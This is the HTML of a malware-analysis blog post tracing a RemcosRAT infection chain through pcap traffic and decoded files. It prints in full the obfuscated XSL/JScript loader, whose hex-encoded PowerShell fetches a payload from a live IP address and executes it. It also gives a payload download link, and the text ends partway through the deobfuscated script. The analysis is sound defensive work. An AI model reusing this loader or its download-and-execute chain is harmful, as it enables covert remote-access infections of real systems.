<!DOCTYPE html><html lang="en" class="scroll-smooth"><head><meta charSet="utf-8"/><script>!function(){try {var d=document.documentElement.classList;d.remove('light','dark');var e=localStorage.getItem('theme');d.add('dark');if("system"===e||(!e&&false)){var t="(prefers-color-scheme: dark)",m=window.matchMedia(t);m.media!==t||m.matches?d.add('dark'):d.add('light')}else if(e) d.add(e)}catch(e){}}()</script><meta content="width=device-width, initial-scale=1" name="viewport"/><title>RemcosRat infection chain from excel with Macros</title><meta name="robots" content="follow, index"/><meta name="description" content="RemcosRAT is a Fileless multi-stage malware that is distributed through malicious macros in Excel files."/><meta property="og:url" content="https://thuri10.github.io/blog/remcosrat"/><meta property="og:type" content="article"/><meta property="og:site_name" content="Solar Bits"/><meta property="og:description" content="RemcosRAT is a Fileless multi-stage malware that is distributed through malicious macros in Excel files."/><meta property="og:title" content="RemcosRat infection chain from excel with Macros"/><meta property="og:image" content="https://thuri10.github.io/static/images/mal/remcosrat/headmail.jpg"/><meta name="twitter:card" content="summary_large_image"/><meta name="twitter:site" content="https://twitter.com/0xhexski"/><meta name="twitter:title" content="RemcosRat infection chain from excel with Macros"/><meta name="twitter:description" content="RemcosRAT is a Fileless multi-stage malware that is distributed through malicious macros in Excel files."/><meta name="twitter:image" content="https://thuri10.github.io/static/images/mal/remcosrat/headmail.jpg"/><link rel="canonical" href="https://thuri10.github.io/blog/remcosrat"/><meta property="article:published_time" content="2022-01-25T00:00:00.000Z"/><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "Article",
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://thuri10.github.io/blog/remcosrat"
  },
  "headline": "RemcosRat infection chain from excel with Macros",
  "image": [
    {
      "@type": "ImageObject",
      "url": "https://thuri10.github.io/static/images/mal/remcosrat/headmail.jpg"
    }
  ],
  "datePublished": "2022-01-25T00:00:00.000Z",
  "dateModified": "2022-01-25T00:00:00.000Z",
  "author": [
    {
      "@type": "Person",
      "name": "Thuri"
    }
  ],
  "publisher": {
    "@type": "Organization",
    "name": "Thuri10",
    "logo": {
      "@type": "ImageObject",
      "url": "https://thuri10.github.io/static/images/logo.png"
    }
  },
  "description": "RemcosRAT is a Fileless multi-stage malware that is distributed through malicious macros in Excel files."
}</script><meta name="next-head-count" content="20"/><link rel="apple-touch-icon" sizes="76x76" href="/static/favicons/apple-touch-icon.png"/><link rel="icon" type="image/png" sizes="32x32" href="/static/favicons/favicon-32x32.png"/><link rel="icon" type="image/png" sizes="16x16" href="/static/favicons/favicon-16x16.png"/><link rel="manifest" href="/static/favicons/site.webmanifest"/><link rel="mask-icon" href="/static/favicons/safari-pinned-tab.svg" color="#5bbad5"/><meta name="msapplication-TileColor" content="#000000"/><meta name="theme-color" content="#000000"/><link rel="alternate" type="application/rss+xml" href="/feed.xml"/><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.13.11/dist/katex.min.css" integrity="sha384-Um5gpz1odJg5Z4HAmzPtgZKdTBHZdw8S29IecapCSB31ligYPhHQZMIlWLYQGVoc" crossorigin="anonymous"/><link rel="preload" href="/_next/static/css/5015c81d955992a5.css" as="style"/><link rel="stylesheet" href="/_next/static/css/5015c81d955992a5.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" nomodule="" src="/_next/static/chunks/polyfills-c67a75d1b6f99dc8.js"></script><script src="/_next/static/chunks/webpack-d19814fcf787c488.js" defer=""></script><script src="/_next/static/chunks/framework-97d5d6e713538c3d.js" defer=""></script><script src="/_next/static/chunks/main-56cb050b8f4d5bdc.js" defer=""></script><script src="/_next/static/chunks/pages/_app-b8f1a2a9a54e1f44.js" defer=""></script><script src="/_next/static/chunks/15-d6e72821fda09dc2.js" defer=""></script><script src="/_next/static/chunks/623-c1c42e432517d218.js" defer=""></script><script src="/_next/static/chunks/418-25ea0c7be4f6e68e.js" defer=""></script><script src="/_next/static/chunks/984-ba1c1a2a6a247638.js" defer=""></script><script src="/_next/static/chunks/883-e5fd7b43ed0c57ff.js" defer=""></script><script src="/_next/static/chunks/pages/blog/%5B...slug%5D-2eb0af3233d10bc2.js" defer=""></script><script src="/_next/static/TTM5K-2h9ABH7fjyD5O84/_buildManifest.js" defer=""></script><script src="/_next/static/TTM5K-2h9ABH7fjyD5O84/_ssgManifest.js" defer=""></script></head><body class="bg-white text-black antialiased dark:bg-gray-900 dark:text-white"><div id="__next" data-reactroot=""><div class="mx-auto max-w-3xl px-4 sm:px-6 xl:max-w-5xl xl:px-0"><div class="flex h-screen flex-col justify-between"><header class="flex items-center justify-between py-10"><div><a aria-label="SolarBits" href="/"><div class="flex items-center justify-between"><div class="mr-3"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="344.564 330.278 111.737 91.218" width="53.87" height="43.61"><defs><linearGradient id="logo_svg__b" gradientUnits="userSpaceOnUse" x1="420.97" y1="331.28" x2="420.97" y2="418.5"><stop style="stop-color:#06b6d4;stop-opacity:1" offset="0%"></stop><stop style="stop-color:#67e8f9;stop-opacity:1" offset="100%"></stop></linearGradient><linearGradient id="logo_svg__d" gradientUnits="userSpaceOnUse" x1="377.89" y1="331.28" x2="377.89" y2="418.5"><stop style="stop-color:#06b6d4;stop-opacity:1" offset="0%"></stop><stop style="stop-color:#67e8f9;stop-opacity:1" offset="100%"></stop></linearGradient><path d="M453.3 331.28v28.57l-64.66 58.65v-30.08l64.66-57.14Z" id="logo_svg__a"></path><path d="M410.23 331.28v28.57l-64.67 58.65v-30.08l64.67-57.14Z" id="logo_svg__c"></path></defs><use xlink:href="#logo_svg__a" fill="url(#logo_svg__b)"></use><use xlink:href="#logo_svg__c" fill="url(#logo_svg__d)"></use></svg></div><div class="hidden h-6 text-2xl font-semibold sm:block">SolarBits</div></div></a></div><div class="flex items-center text-base leading-5"><div class="hidden sm:block"><a class="p-1 font-medium text-gray-900 dark:text-gray-100 sm:p-4" href="/blog">Blog</a><a class="p-1 font-medium text-gray-900 dark:text-gray-100 sm:p-4" href="/tags">Tags</a><a class="p-1 font-medium text-gray-900 dark:text-gray-100 sm:p-4" href="/about">About</a></div><button aria-label="Toggle Dark Mode" type="button" class="ml-1 mr-1 h-8 w-8 rounded p-1 sm:ml-4"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor" class="text-gray-900 dark:text-gray-100"><path d="M17.293 13.293A8 8 0 016.707 2.707a8.001 8.001 0 1010.586 10.586z"></path></svg></button><div class="sm:hidden"><button type="button" class="ml-1 mr-1 h-8 w-8 rounded py-1" aria-label="Toggle Menu"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor" class="text-gray-900 dark:text-gray-100"><path fill-rule="evenodd" d="M3 5a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 10a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 15a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1z" clip-rule="evenodd"></path></svg></button><div class="fixed top-0 left-0 z-10 h-full w-full transform bg-gray-200 opacity-95 duration-300 ease-in-out dark:bg-gray-800 translate-x-full"><div class="flex justify-end"><button type="button" class="mr-5 mt-11 h-8 w-8 rounded" aria-label="Toggle Menu"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor" class="text-gray-900 dark:text-gray-100"><path fill-rule="evenodd" d="M4.293 4.293a1 1 0 011.414 0L10 8.586l4.293-4.293a1 1 0 111.414 1.414L11.414 10l4.293 4.293a1 1 0 01-1.414 1.414L10 11.414l-4.293 4.293a1 1 0 01-1.414-1.414L8.586 10 4.293 5.707a1 1 0 010-1.414z" clip-rule="evenodd"></path></svg></button></div><nav class="fixed mt-8 h-full"><div class="px-12 py-4"><a class="text-2xl font-bold tracking-widest text-gray-900 dark:text-gray-100" href="/blog">Blog</a></div><div class="px-12 py-4"><a class="text-2xl font-bold tracking-widest text-gray-900 dark:text-gray-100" href="/tags">Tags</a></div><div class="px-12 py-4"><a class="text-2xl font-bold tracking-widest text-gray-900 dark:text-gray-100" href="/about">About</a></div></nav></div></div></div></header><main class="mb-auto"><div class="mx-auto max-w-3xl px-4 sm:px-6 xl:max-w-5xl xl:px-0"><div class="fixed right-8 bottom-8 hidden flex-col gap-3 md:flex"><button aria-label="Scroll To Top" type="button" style="opacity:0" class="rounded-full bg-gray-200 p-2 text-gray-500 transition-all hover:bg-gray-300 dark:bg-gray-700 dark:text-gray-400 dark:hover:bg-gray-600"><svg class="h-5 w-5" viewBox="0 0 20 20" fill="currentColor"><path fill-rule="evenodd" d="M3.293 9.707a1 1 0 010-1.414l6-6a1 1 0 011.414 0l6 6a1 1 0 01-1.414 1.414L11 5.414V17a1 1 0 11-2 0V5.414L4.707 9.707a1 1 0 01-1.414 0z" clip-rule="evenodd"></path></svg></button></div><article><div class="xl:divide-y xl:divide-gray-200 xl:dark:divide-gray-700"><header class="relative pt-6 xl:pb-6"><div class="space-y-1 text-center"><dl class="space-y-10"><div><dt class="sr-only">Published on</dt><div><h1 class="text-3xl font-bold leading-9 tracking-tight text-gray-900 dark:text-gray-100 sm:text-4xl sm:leading-10 md:text-5xl md:leading-14">RemcosRat infection chain from excel with Macros</h1></div><dd class="flex items-center justify-center text-base font-medium leading-6 text-gray-500 dark:text-gray-400"><time dateTime="2022-01-25" class="flex items-center"><i class="inline-block twa  twa-calendar"></i><span class="ml-1.5">Tuesday, January 25, 2022</span></time><span class="mx-2">-</span><div class="flex items-center"><i class="inline-block twa  twa-hourglass-not-done"></i><span class="ml-1.5">6 mins read</span></div></dd></div></dl></div></header><div class="divide-y divide-gray-200 pb-8 dark:divide-gray-700 xl:grid xl:grid-cols-4 xl:gap-x-6 xl:divide-y-0" style="grid-template-rows:auto 1fr"><dl class="pt-6 pb-5 xl:border-b xl:border-gray-200 xl:pt-11 xl:dark:border-gray-700"></dl><div class="divide-y divide-gray-200 dark:divide-gray-700 xl:col-span-3 xl:row-span-2 xl:pb-0"><div class="prose max-w-none pt-10 pb-8 dark:prose-dark"><h1 id="what-is-remcosrat"><a href="#what-is-remcosrat" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>What is RemcosRat?</h1><p>RemcosRAT is a Fileless multi-stage malware that is distributed through malicious macros in Excel files. The malware enables remote administration of infected systems to perform unintended actions. This is a simple guide on understanding RemcosRat infection chain. The RemcosRAT infection can be described as shown in the image by <a target="_blank" rel="noopener noreferrer" href="https://twitter.com/Unit42_Intel/status/1478744612516900868">@Unit 42</a>.</p><div><span style="box-sizing:border-box;display:inline-block;overflow:hidden;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;position:relative;max-width:100%"><span style="box-sizing:border-box;display:block;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;max-width:100%"><img style="display:block;max-width:100%;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0" alt="" aria-hidden="true" src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%272480%27%20height=%271287%27/%3e"/></span><img alt="Infection Chain" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%"/><noscript><img alt="Infection Chain" src="/static/images/mal/remcosrat/chain.jpeg" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%" loading="lazy"/></noscript></span></div><p>The infection chain start through phishing of the targets through mail services, the final payload of the infection chain is the used for communicating through TCP port 10174 as shown in the image.</p><p>The samples and IOC can be downloaded from the following malware-traffic-analysis website <a target="_blank" rel="noopener noreferrer" href="https://www.malware-traffic-analysis.net/2022/01/04/index.html">RemcosRat sample</a>.</p><h2 id="pcap-analysis"><a href="#pcap-analysis" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>Pcap Analysis</h2><p><a target="_blank" rel="noopener noreferrer" href="https://twitter.com/malware_traffic/status/1478755988023001089">Brad</a> has provided infection traffic pcap of the malware samples in his website.</p><div><span style="box-sizing:border-box;display:inline-block;overflow:hidden;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;position:relative;max-width:100%"><span style="box-sizing:border-box;display:block;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;max-width:100%"><img style="display:block;max-width:100%;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0" alt="" aria-hidden="true" src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%271361%27%20height=%27229%27/%3e"/></span><img alt="Http filter" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%"/><noscript><img alt="Http filter" src="/static/images/mal/remcosrat/http_filter.png" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%" loading="lazy"/></noscript></span></div><p>Image above shows a Filter of <strong>http</strong> traffic in wireshark.The malware is trying to get additional samples using <strong>GET</strong> method as highlighted.</p><p>From the tweet provided by <strong>unit42intel</strong>, the above link of the onedrive downloads a <code>VBS</code> file. The vbs file is not available in the onedrive at the time of writting but it is provided in the malware-traffic-analysis website.</p><div class="relative"><pre><code class="code-highlight language-html"><span class="code-line"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span>
</span><span class="code-line">  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>
</span><span class="code-line">    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>Object moved<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span>
</span><span class="code-line">  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span>
</span><span class="code-line">  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>
</span><span class="code-line">    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">&gt;</span></span>
</span><span class="code-line">      Object moved to
</span><span class="code-line">      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span>
</span></span><span class="code-line"><span class="token tag">        <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>https://onedrive.live.com/download?cid=64F8294A00286885<span class="token entity named-entity" title="&amp;">&amp;amp;</span>resid=64F8294A00286885%21770<span class="token entity named-entity" title="&amp;">&amp;amp;</span>authkey=ABI3zrc6BsVUKxU<span class="token punctuation">&quot;</span></span>
</span></span><span class="code-line"><span class="token tag">        <span class="token punctuation">&gt;</span></span>here<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span>
</span></span><span class="code-line"><span class="token tag">      <span class="token punctuation">&gt;</span></span>.
</span><span class="code-line">    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">&gt;</span></span>
</span><span class="code-line">  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>
</span><span class="code-line"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span>
</span></code></pre></div><p>Verify the sha256 hash of the <code>misc.vbs</code> matches the one provided in IOcs of Remcos Rat.</p><div class="relative"><pre><code class="code-highlight language-bash"><span class="code-line">@remcosrat$ shasum -a <span class="token number">256</span> misc.vbs
</span><span class="code-line">95c0a9e6463a2eb1bbfe3198cd4b6cd74927a209ca4ab17501c2f444494f4499  misc.vbs
</span></code></pre></div><h2 id="stage2-downloader-atcnjpg"><a href="#stage2-downloader-atcnjpg" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>Stage2 Downloader (atcn.jpg)</h2><p>Right click the <code>GET /atcn.jpg</code> url in wireshark and follow the <strong>http</strong> stream. The HTTP streams of the urls accessed by the malware are as shown below.</p><div><span style="box-sizing:border-box;display:inline-block;overflow:hidden;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;position:relative;max-width:100%"><span style="box-sizing:border-box;display:block;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;max-width:100%"><img style="display:block;max-width:100%;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0" alt="" aria-hidden="true" src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%27882%27%20height=%27587%27/%3e"/></span><img alt="url wireshark" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%"/><noscript><img alt="url wireshark" src="/static/images/mal/remcosrat/stage1_stream.png" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%" loading="lazy"/></noscript></span></div><p>From the above, the malware is executing a powershell script. The script seems to be obsfuscated. For further analysis we can export all the http objects. For exporting http objects, Click the <code>File -&gt; Export Objects -&gt; HTTP</code> in wireshark. select saveall to download all the http objects in malware connection traffic.</p><div><span style="box-sizing:border-box;display:inline-block;overflow:hidden;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;position:relative;max-width:100%"><span style="box-sizing:border-box;display:block;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;max-width:100%"><img style="display:block;max-width:100%;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0" alt="" aria-hidden="true" src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%27742%27%20height=%27196%27/%3e"/></span><img alt="Export Http objects " src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%"/><noscript><img alt="Export Http objects " src="/static/images/mal/remcosrat/exported_http.png" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%" loading="lazy"/></noscript></span></div><p>First check the file format of the files, The downloaded files as are not images as the extensions suuggests to. They are ASCCII text files.</p><div class="relative"><pre><code class="code-highlight language-bash"><span class="code-line">$ <span class="token function">file</span> atcn.jpg
</span><span class="code-line">atcn.jpg: ASCII text, with very long lines <span class="token punctuation">(</span><span class="token number">4130</span><span class="token punctuation">)</span>, with CRLF line terminators
</span><span class="code-line">$ <span class="token function">file</span> calient.jpg
</span><span class="code-line">calient.jpg: ASCII text, with very long lines <span class="token punctuation">(</span><span class="token number">65536</span><span class="token punctuation">)</span>, with no line terminators
</span></code></pre></div><p>Below is the obfuscated powershell script.</p><div class="relative"><pre><code class="code-highlight language-javascript"><span class="code-line"><span class="token operator">&lt;</span>xsl<span class="token operator">:</span>stylesheet version<span class="token operator">=</span><span class="token string">&quot;1.0&quot;</span>
</span><span class="code-line">      <span class="token literal-property property">xmlns</span><span class="token operator">:</span>xsl<span class="token operator">=</span><span class="token string">&quot;http://www.w3.org/1999/XSL/Transform&quot;</span>
</span><span class="code-line">      <span class="token literal-property property">xmlns</span><span class="token operator">:</span>msxsl<span class="token operator">=</span><span class="token string">&quot;urn:schemas-microsoft-com:xslt&quot;</span>
</span><span class="code-line">      <span class="token literal-property property">xmlns</span><span class="token operator">:</span>user<span class="token operator">=</span><span class="token string">&quot;http://mycompany.com/mynamespace&quot;</span><span class="token operator">&gt;</span>
</span><span class="code-line">
</span><span class="code-line"> <span class="token operator">&lt;</span>msxsl<span class="token operator">:</span>script language<span class="token operator">=</span><span class="token string">&quot;JScript&quot;</span> <span class="token keyword">implements</span><span class="token operator">-</span>prefix<span class="token operator">=</span><span class="token string">&quot;user&quot;</span><span class="token operator">&gt;</span>
</span><span class="code-line"><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token constant">CDATA</span><span class="token punctuation">[</span>
</span><span class="code-line">
</span><span class="code-line">
</span><span class="code-line"><span class="token keyword">var</span> r <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ActiveXObject</span><span class="token punctuation">(</span><span class="token function">x0asd44</span><span class="token punctuation">(</span><span class="token string">&quot;5368656c6c2e4170706c69636174696f6e&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</span><span class="code-line">
</span><span class="code-line"><span class="token keyword">var</span> yy<span class="token operator">=</span>r<span class="token punctuation">.</span><span class="token function property-access method"><span class="token maybe-class-name">ShellExecute</span></span><span class="token punctuation">(</span><span class="token string">&quot;powershell.exe&quot;</span><span class="token punctuation">,</span><span class="token function">x0asd44</span><span class="token punctuation">(</span><span class="token string">&quot;202444436F626356456D76694A72416B484D595547573D273237253542253736253646253639253634253237253230253242253230253237253544253230253542253533253739253733253734253237253230253242253230253237253635253644253245253532253635253636253643253635253237253230253242253230253237253633253734253639253646253645253245253431253733253733253635253237253230253242253230253237253644253632253643253739253544253341253341253443253646253631253634253537253639253237253230253242253230253237253734253638253530253631253732253734253639253631253643253445253631253644253635253238253237253237253444253639253633253732253646253733253646253636253734253245253536253639253733253735253631253643253432253631253733253639253633253237253237253239253237253743253439253435253538253342253234253734253335253336253636253637253230253344253230253542253435253645253735253644253544253341253341253534253646253446253632253641253635253633253734253238253542253533253739253733253734253635253644253245253445253635253734253245253533253635253633253735253732253639253734253739253530253732253646253734253646253633253646253643253534253739253730253635253544253243253230253333253330253337253332253239253342253542253533253739253733253734253635253644253245253445253635253734253245253533253635253732253736253639253633253635253530253646253639253645253734253444253631253645253631253637253635253732253544253341253341253533253635253633253735253732253639253734253739253530253732253646253734253646253633253646253643253230253344253230253234253734253335253336253636253637253342253634253646253230253742253234253730253639253645253637253230253344253230253734253635253733253734253244253633253646253645253645253635253633253734253639253646253645253230253244253633253646253644253730253230253637253646253646253637253643253635253245253633253646253644253230253244253633253646253735253645253734253230253331253230253244253531253735253639253635253734253744253230253735253645253734253639253643253230253238253234253730253639253645253637253239253342253234253734253734253739253344253237253238253445253635253737253244253237253242253237253446253632253641253635253237253242253237253633253734253230253445253635253237253242253237253734253245253537253635253237253242253237253632253433253643253639253237253242253237253635253645253734253239253237253743253439253630253435253630253538253342253234253644253736253344253230253542253444253639253633253732253646253733253646253636253734253245253536253639253733253735253631253643253432253631253733253639253633253245253439253645253734253635253732253631253633253734253639253646253645253544253341253341253433253631253643253643253432253739253645253631253644253635253238253234253734253734253739253243253237253434253646253737253645253643253646253631253634253533253734253732253639253645253637253237253243253542253444253639253633253732253646253733253646253636253734253245253536253639253733253735253631253643253432253631253733253639253633253245253433253631253643253643253534253739253730253635253544253341253341253444253635253734253638253646253634253243253237253638253734253734253730253237253230253242253230253237253341253246253246253331253330253334253245253332253332253333253245253331253331253339253245253331253336253337253246253633253631253643253639253635253645253734253245253641253730253637253237253239253342253234253732253337253338253636253634253330253330253330253733253634253344253230253234253644253736253230253244253733253730253643253639253734253230253237253235253237253230253743253436253646253732253435253631253633253638253244253446253632253641253635253633253734253230253742253542253633253638253631253732253544253542253632253739253734253635253544253232253330253738253234253546253232253744253342253234253739253335253641253638253336253332253634253636253330253344253230253439253630253435253630253538253238253234253732253337253338253636253634253330253330253330253733253634253230253244253641253646253639253645253230253237253237253239273B246A6D3D2444436F626356456D76694A72416B484D595547572E53706C69742827252729207C20666F7245616368207B5B636861725D285B636F6E766572745D3A3A746F696E74313628245F2C313629297D3B496045605828246A6D202D6A6F696E20272729&quot;</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">&quot;&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;&quot;</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="code-line">
</span><span class="code-line"><span class="token keyword">function</span> <span class="token function">x0asd44</span><span class="token punctuation">(</span><span class="token parameter">hex</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
</span><span class="code-line">    <span class="token keyword">var</span> str <span class="token operator">=</span> <span class="token string">&#x27;&#x27;</span><span class="token punctuation">;</span>
</span><span class="code-line">    <span class="token keyword control-flow">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> hex<span class="token punctuation">.</span><span class="token property-access">length</span><span class="token punctuation">;</span> i <span class="token operator">+=</span> <span class="token number">2</span><span class="token punctuation">)</span> str <span class="token operator">+=</span> <span class="token class-name known-class-name">String</span><span class="token punctuation">.</span><span class="token function property-access method">fromCharCode</span><span class="token punctuation">(</span><span class="token function">parseInt</span><span class="token punctuation">(</span>hex<span class="token punctuation">.</span><span class="token function property-access method">substr</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="code-line">    <span class="token keyword control-flow">return</span> str<span class="token punctuation">;</span>
</span><span class="code-line"><span class="token punctuation">}</span>
</span><span class="code-line">
</span><span class="code-line"><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">&gt;</span> <span class="token operator">&lt;</span><span class="token operator">/</span>msxsl<span class="token operator">:</span>script<span class="token operator">&gt;</span>
</span><span class="code-line"><span class="token operator">&lt;</span><span class="token operator">/</span>xsl<span class="token operator">:</span>stylesheet<span class="token operator">&gt;</span>
</span></code></pre></div><p>First decode the string we are passing to <strong>ActiveXObject</strong> function.</p><div class="relative"><pre><code class="code-highlight language-javascript"><span class="code-line"><span class="token keyword">function</span> <span class="token function">x0asd44</span><span class="token punctuation">(</span><span class="token parameter">hex</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
</span><span class="code-line">  <span class="token keyword">var</span> str <span class="token operator">=</span> <span class="token string">&#x27;&#x27;</span>
</span><span class="code-line">  <span class="token keyword control-flow">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> hex<span class="token punctuation">.</span><span class="token property-access">length</span><span class="token punctuation">;</span> i <span class="token operator">+=</span> <span class="token number">2</span><span class="token punctuation">)</span> str <span class="token operator">+=</span> <span class="token class-name known-class-name">String</span><span class="token punctuation">.</span><span class="token function property-access method">fromCharCode</span><span class="token punctuation">(</span><span class="token function">parseInt</span><span class="token punctuation">(</span>hex<span class="token punctuation">.</span><span class="token function property-access method">substr</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</span><span class="code-line">  <span class="token keyword control-flow">return</span> str
</span><span class="code-line"><span class="token punctuation">}</span>
</span><span class="code-line">
</span><span class="code-line"><span class="token class-name console">console</span><span class="token punctuation">.</span><span class="token function property-access method">log</span><span class="token punctuation">(</span><span class="token function">x0asd44</span><span class="token punctuation">(</span><span class="token string">&#x27;5368656c6c2e4170706c69636174696f6e&#x27;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</span></code></pre></div><p>Executing the above javascript code, our hexstring string parameter is decoded to <code>Shell.Application</code>.</p><p>Below is the deobfuscated powershell script which is passed <code>shell.Application</code> as shown in the obsfucated script.</p><div class="relative"><pre><code class="code-highlight language-powershell"><span class="code-line"><span class="token string">&#x27;[void] [System.Reflection.Assembly]::LoadWithPartialName(&#x27;&#x27;Microsoft.VisualBasic&#x27;&#x27;)&#x27;</span><span class="token punctuation">|</span><span class="token function">IEX</span><span class="token punctuation">;</span>
</span><span class="code-line"><span class="token variable">$t56fg</span> = <span class="token namespace">[Enum]</span>::ToObject<span class="token punctuation">(</span><span class="token namespace">[System.Net.SecurityProtocolType]</span><span class="token punctuation">,</span> 3072<span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="code-line"><span class="token namespace">[System.Net.ServicePointManager]</span>::SecurityProtocol = <span class="token variable">$t56fg</span><span class="token punctuation">;</span>
